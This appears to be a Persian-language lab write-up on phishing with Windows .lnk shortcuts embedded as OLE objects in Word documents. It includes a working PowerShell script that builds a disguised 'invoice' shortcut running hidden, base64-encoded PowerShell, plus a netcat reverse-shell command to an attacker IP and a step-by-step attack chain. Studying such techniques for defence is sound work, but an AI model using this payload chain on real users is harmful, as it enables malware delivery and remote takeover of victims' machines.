
این آزمایشگاه تکنیکی محبوب در فیشینگ را بررسی می‌کند که مهاجمان فایل‌های `.lnk` را درون اسناد آفیس جاسازی می‌کنند و با آیکون‌های معمول Word آن‌ها را پنهان می‌کنند تا قربانی را فریب دهند رویشان کلیک کند و اجرا شوند.

---

- `.lnk`
- فایل‌های میان‌بُر (Windows shortcut) هستند که می‌توانند مسیر یک برنامه یا دستور را مشخص کنند (مثلاً `cmd.exe /c ...` یا ارجاع به فایل اجرایی روی شبکه).
    
- **OLE (Object Linking and Embedding)** 
- مکانیسمی در Office است که اجازه می‌دهد اشیاء خارجی (فایل‌ها، آیکون‌ها، کامپوننت‌ها) در سند جاسازی یا لینک شوند. مهاجمان می‌توانند یک `.lnk` را به‌عنوان یک شیء OLE در سند قرار دهند و آن را طوری نمایش دهند که شبیه آیکون یا تصویر معمولی Word به نظر برسد.
    
- وقتی کاربر روی آن شیء دوبار کلیک یا در برخی حالات «Enable Content / Update Links» را بپذیرد، آفیس ممکن است تلاش کند میان‌بُر را باز کند که منجر به اجرای دستور یا برنامه‌ی مقصد شود — این می‌تواند نقطهٔ شروع اجرای بدافزار یا دانلود دوبارهٔ payload باشد.
    
- خطر این تکنیک به خاطر **فریب ظاهری** است: کاربر ممکن است فکر کند روی یک آیکون بی‌ضرر کلیک کرده در حالی که در واقع میان‌بُری است که فرمان اجرا می‌کند.


---

## 1

Creating an .LNK file that will trigger the payload once executed:

```
$command = 'Start-Process c:\shell.cmd'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\experiments\ole+lnk\Invoice-FinTech-0900541.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA=="
$link.save()
```

- اسکریپت پاورشل یک شورتکات ویندوزی (`.lnk`) می‌سازد که وقتی اجرا شود، `powershell.exe` را با آرگومان `-encodedCommand <base64>` اجرا می‌کند.
    
- محتوای Base64 در مثال تو وقتی decode بشود برابر است با
- 
```
Start-Process c:\shell.cmd
```

یعنی پاورشل با فرمانی تلاش می‌کند تا `c:\shell.cmd` را اجرا کند؛ و داخلِ `shell.cmd` هم یک Netcat که به آدرس `10.0.0.5:443` وصل شده و `cmd.exe` را متصل می‌کند (reverse shell) — این رفتار دقیقاً همان payloadی است که تو نوشتی.  
(برای مرجع: LNKها به‌عنوان قالبی که می‌تواند فرمان/آرگومان به پروسهٔ هدف بدهد، در حملات سوءاستفاده شده‌اند).

وقتی `Start-Process c:\shell.cmd` اجرا می‌شود، ویندوز آن فایل `shell.cmd` را اجرا می‌کند. اگر داخل `shell.cmd` دستوری شبیهِ

```
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```

یعنی قربانی یک سوکت برقرار میکنه با مهاجم سپس cmd.exe رو هدایت میکنه به اون IP 


---

![[Pasted image 20251101164612.png]]

![[Pasted image 20251101164637.png]]


![[Pasted image 20251101164701.png]]


![[Pasted image 20251101164712.png]]

حالا اگر کلیک کند روی OLE Reverce shell برقرار میشود 

![[Pasted image 20251101164752.png]]

## ✅ زنجیرهٔ کاملِ عملیاتی (چیزی که تو گفتی، با جزئیات)

1. **مهاجم یک فایل `shell.cmd` آماده می‌کند** که شامل دستوری است برای باز کردن یک reverse shell (مثلاً فراخوانی `nc.exe` یا هر باینری دیگر برای اتصال خروجی به IP مهاجم).
    
2. **مهاجم یک شورتکات `.lnk` می‌سازد** که `target` آن `powershell.exe` است و در آرگومان‌ها از `-EncodedCommand <Base64>` استفاده می‌شود. محتوای Base64 وقتی decode شود حاوی چیزی شبیه `Start-Process c:\shell.cmd` خواهد بود — یعنی پاورشل وقتی اجرا شد، `shell.cmd` را اجرا می‌کند.
    
3. **این `.lnk` داخل یک سند Word (OLE embedding)** جاسازی یا پیوست می‌شود و ممکن است با آیکون/نامی فریبنده پوشانده شود.
    
4. **قربانی سند را باز می‌کند و روی شیء/آیکون کلیک می‌کند** (یا در برخی حالات خاص اگر تنظیمات محافظتی غیرفعال باشد، Office می‌تواند اجازهٔ اجرای شیء را بدهد).
    
5. **شورتکات اجرا می‌شود → powershell اجرا می‌شود → shell.cmd اجرا می‌شود → netcat یا هر ابزار دیگری اتصال خروجی به IP:Port مهاجم برقرار می‌کند.**
    
6. **نتیجه:** مهاجم یک session تعاملی (reverse shell) روی سیستم قربانی بدست می‌آورد.
    

نکتهٔ کلیدی: در اکثر سناریوهای واقعی **نیاز به تعامل کاربر** هست (مثلاً دوبار کلیک روی آیکون یا قبول پیام «Enable Content»). در نسخه‌ها و پچ‌های جدید Office، بسیاری از مسیرهای اجرای خودکار بلاک شده‌اند — مگر اینکه محیط ضعیف، تنظیمات غیرفعال یا کاربر فریب‌خورده باشد.